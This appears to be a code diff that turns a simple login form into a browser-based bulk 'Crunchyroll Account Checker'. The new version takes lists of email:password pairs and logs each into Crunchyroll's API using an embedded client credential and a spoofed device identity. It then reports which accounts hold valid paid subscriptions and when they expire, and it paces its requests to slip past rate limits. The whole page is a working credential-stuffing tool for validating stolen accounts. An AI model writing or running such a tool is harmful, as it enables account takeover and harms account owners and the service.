@@ -1,51 +1,297 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Crunchyroll Login Checker</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      text-align: center;
-    }
-    input {
-      width: 80%;
-      padding: 10px;
-      margin-bottom: 15px;
-      font-size: 16px;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Crunchyroll Account Checker</title>
+<style>
+  body { font-family: Arial, sans-serif; margin: 20px; background: #121212; color: #eee; }
+  textarea { width: 100%; height: 150px; background: #222; color: #eee; border: 1px solid #444; padding: 10px; font-family: monospace; }
+  button { padding: 10px 20px; margin: 10px 0; background: #00aaff; border: none; color: white; font-weight: bold; cursor: pointer; }
+  button:disabled { background: #555; cursor: not-allowed; }
+  .result { margin: 10px 0; padding: 10px; background: #222; border: 1px solid #444; }
+  .success { color: #0f0; }
+  .failure { color: #f55; }
+  .info { color: #aaa; }
+</style>
 </head>
 <body>
-  <h2>Crunchyroll Login Checker</h2>
 
-  <input type="text" id="email" placeholder="Email"><br>
-  <input type="password" id="password" placeholder="Password"><br>
-  <button onclick="sendCreds()">Check Login</button>
+<h1>Crunchyroll Account Checker</h1>
 
-  <script>
-    function sendCreds() {
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
+<p>Enter accounts (one per line) in format <code>email:password</code>:</p>
+<textarea id="accountsInput" placeholder="example@example.com:password123"></textarea>
 
-      if (!email || !password) {
-        alert("Please fill both fields.");
-        return;
-      }
+<br />
+<button id="startBtn">Start Checking</button>
 
-      // Safely call Android interface if available
-      if (typeof AndroidInterface !== "undefined" && AndroidInterface.sendCredentials) {
-        AndroidInterface.sendCredentials(email, password);
-      } else {
-        alert("Android interface not available.");
+<div id="results"></div>
+
+<script>
+  // Embedded country data
+  const countryData = [
+    { code: "US", name: "United States 🇺🇸" },
+    { code: "GB", name: "United Kingdom 🇬🇧" },
+    { code: "CA", name: "Canada 🇨🇦" },
+    { code: "AU", name: "Australia 🇦🇺" },
+    { code: "DE", name: "Germany 🇩🇪" },
+    { code: "FR", name: "France 🇫🇷" },
+    { code: "JP", name: "Japan 🇯🇵" },
+    { code: "BR", name: "Brazil 🇧🇷" },
+    { code: "IN", name: "India 🇮🇳" },
+    { code: "MX", name: "Mexico 🇲🇽" }
+  ];
+
+  function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+      let r = Math.random() * 16 | 0,
+          v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function urlEncode(text) {
+    return encodeURIComponent(text);
+  }
+
+  function getRemainingDays(expiryDateStr) {
+    try {
+      const expiryDate = new Date(expiryDateStr + "T00:00:00Z");
+      const now = new Date();
+      const diffTime = expiryDate - now;
+      return Math.floor(diffTime / (1000 * 60 * 60 * 24));
+    } catch {
+      return 0;
+    }
+  }
+
+  function translateCountry(code) {
+    if (!code) return "Unknown";
+    const c = countryData.find(c => c.code.toUpperCase() === code.toUpperCase());
+    return c ? c.name : code;
+  }
+
+  function determinePlanType(benefits) {
+    if (!benefits || benefits.length === 0) return "FREE";
+    for (const benefit of benefits) {
+      const name = (benefit.benefit || "").toLowerCase();
+      if (name.includes("ultimate")) return "ULTIMATE FAN";
+      if (name.includes("mega")) return "MEGA FAN";
+      if (name.includes("fan")) return "FAN";
+    }
+    return "FREE";
+  }
+
+  class CrunchyrollChecker {
+    constructor(username, password) {
+      this.username = username;
+      this.password = password;
+      this.accessToken = null;
+      this.accountId = null;
+      this.email = null;
+      this.planName = null;
+      this.planType = null;
+      this.expiry = null;
+      this.remainingDays = null;
+      this.country = null;
+      this.rateLimitWait = 5000; // ms
+      this.maxRetries = 3;
+    }
+
+    async requestWithRetry(url, options = {}, retries = 0) {
+      try {
+        const resp = await fetch(url, options);
+        if (resp.status === 429) {
+          const retryAfter = resp.headers.get("Retry-After");
+          const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : this.rateLimitWait;
+          console.warn(`Rate limited. Waiting ${waitTime}ms before retrying...`);
+          await delay(waitTime);
+          if (retries < this.maxRetries) {
+            return this.requestWithRetry(url, options, retries + 1);
+          }
+        }
+        return resp;
+      } catch (err) {
+        console.error("Request error:", err);
+        if (retries < this.maxRetries) {
+          const waitTime = Math.min(2 ** retries * 1000, 60000);
+          console.log(`Retrying in ${waitTime}ms...`);
+          await delay(waitTime);
+          return this.requestWithRetry(url, options, retries + 1);
+        }
+        throw err;
       }
     }
-  </script>
+
+    async login() {
+      const deviceId = generateUUID();
+      const url = "https://beta-api.crunchyroll.com/auth/v1/token";
+      const body = `username=${urlEncode(this.username)}&password=${urlEncode(this.password)}&grant_type=password&scope=offline_access&device_id=${deviceId}&device_type=SAMSUNG%20SM-S911B%2FDS`;
+
+      const headers = {
+        "host": "www.crunchyroll.com",
+        "authorization": "Basic dGRnYmNwaHh4M3o5cmI3YTE4Mm06VFlGUV9lSEhiRkh0c0pOYzlFamwzWVBzMDN1VUJESFY=",
+        "x-datadog-sampling-priority": "0",
+        "etp-anonymous-id": generateUUID(),
+        "content-type": "application/x-www-form-urlencoded"
+      };
+
+      const resp = await this.requestWithRetry(url, {
+        method: "POST",
+        headers,
+        body
+      });
+
+      if (resp && resp.ok) {
+        const data = await resp.json();
+        this.accessToken = data.access_token;
+        return true;
+      }
+      return false;
+    }
+
+    async getAccountInfo() {
+      const url = "https://beta-api.crunchyroll.com/accounts/v1/me";
+      const headers = {
+        "User-Agent": "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0",
+        "Authorization": `Bearer ${this.accessToken}`
+      };
+      const resp = await this.requestWithRetry(url, { headers });
+      if (resp && resp.ok) {
+        const data = await resp.json();
+        this.accountId = data.external_id;
+        this.email = data.email;
+        this.emailVerified = data.email_verified || false;
+        return true;
+      }
+      return false;
+    }
+
+    async getSubscriptionInfo() {
+      if (!this.accountId) return false;
+
+      const baseHeaders = {
+        "User-Agent": "Crunchyroll/3.48.2 Android/9 okhttp/4.12.0",
+        "Authorization": `Bearer ${this.accessToken}`
+      };
+
+      const subUrl = `https://beta-api.crunchyroll.com/subs/v1/subscriptions/${this.accountId}`;
+      const subResp = await this.requestWithRetry(subUrl, { headers: baseHeaders });
+      if (!subResp || !subResp.ok) return false;
+
+      const subData = await subResp.json();
+      this.planName = subData.product?.name || "Free";
+
+      if (subData.next_renewal_date) {
+        this.expiry = subData.next_renewal_date.split("T")[0];
+        this.remainingDays = getRemainingDays(this.expiry);
+      } else {
+        this.expiry = null;
+        this.remainingDays = null;
+      }
+
+      if (subData.country_code) {
+        this.country = translateCountry(subData.country_code);
+      } else {
+        this.country = "Unknown";
+      }
+
+      const benefitsUrl = `https://beta-api.crunchyroll.com/subs/v1/subscriptions/${this.accountId}/benefits`;
+      const benefitsResp = await this.requestWithRetry(benefitsUrl, { headers: baseHeaders });
+      if (!benefitsResp || !benefitsResp.ok) return false;
+
+      const benefitsData = await benefitsResp.json();
+      this.planType = determinePlanType(benefitsData.items);
+
+      return true;
+    }
+
+    async checkSubscriptionStatus() {
+      const loggedIn = await this.login();
+      if (!loggedIn) return { status: "Failure", reason: "Login failed" };
+
+      const gotAccount = await this.getAccountInfo();
+      if (!gotAccount) return { status: "Failure", reason: "Failed to get account info" };
+
+      const gotSubscription = await this.getSubscriptionInfo();
+      if (!gotSubscription) return { status: "Failure", reason: "Failed to get subscription info" };
+
+      const nowUnix = Math.floor(Date.now() / 1000);
+      const expiryUnix = this.expiry ? Math.floor(new Date(this.expiry + "T00:00:00Z").getTime() / 1000) : 0;
+
+      if (expiryUnix > nowUnix) {
+        if (this.planType !== "FREE") {
+          return {
+            status: "Success",
+            planType: this.planType,
+            planName: this.planName,
+            country: this.country,
+            expiry: this.expiry,
+            remainingDays: this.remainingDays
+          };
+        }
+        return { status: "FREE" };
+      } else if (expiryUnix > 0 && expiryUnix <= nowUnix) {
+        return { status: "EXPIRED" };
+      } else {
+        return { status: "UNKNOWN" };
+      }
+    }
+  }
+
+  // UI elements
+  const startBtn = document.getElementById("startBtn");
+  const accountsInput = document.getElementById("accountsInput");
+  const resultsDiv = document.getElementById("results");
+
+  startBtn.addEventListener("click", async () => {
+    startBtn.disabled = true;
+    resultsDiv.innerHTML = "";
+    const lines = accountsInput.value.split("\n").map(line => line.trim()).filter(line => line.includes(":"));
+
+    for (let i = 0; i < lines.length; i++) {
+      const [username, password] = lines[i].split(":", 2);
+      appendResult(`Checking account ${i + 1} of ${lines.length}: <strong>${username}</strong>`, "info");
+      try {
+        const checker = new CrunchyrollChecker(username, password);
+        const result = await checker.checkSubscriptionStatus();
+
+        if (result.status === "Success") {
+          appendResult(`✔️ <strong>${username}</strong> — Valid subscription! Plan: ${result.planType} (${result.planName}), Country: ${result.country}, Expiry: ${result.expiry}, Days Left: ${result.remainingDays}`, "success");
+        } else if (result.status === "FREE") {
+          appendResult(`ℹ️ <strong>${username}</strong> — Free plan`, "info");
+        } else if (result.status === "EXPIRED") {
+          appendResult(`❌ <strong>${username}</strong> — Subscription expired`, "failure");
+        } else {
+          appendResult(`❌ <strong>${username}</strong> — Check failed or unknown status (${result.status})`, "failure");
+        }
+      } catch (err) {
+        appendResult(`❌ <strong>${username}</strong> — Error: ${err.message}`, "failure");
+      }
+
+      if (i < lines.length - 1) {
+        const waitSec = 3 + Math.random() * 5;
+        appendResult(`Waiting ${waitSec.toFixed(1)} seconds before next check...`, "info");
+        await delay(waitSec * 1000);
+      }
+    }
+
+    appendResult("All accounts checked.", "info");
+    startBtn.disabled = false;
+  });
+
+  function appendResult(text, type = "info") {
+    const div = document.createElement("div");
+    div.className = `result ${type}`;
+    div.innerHTML = text;
+    resultsDiv.appendChild(div);
+    window.scrollTo(0, document.body.scrollHeight);
+  }
+</script>
+
 </body>
 </html>
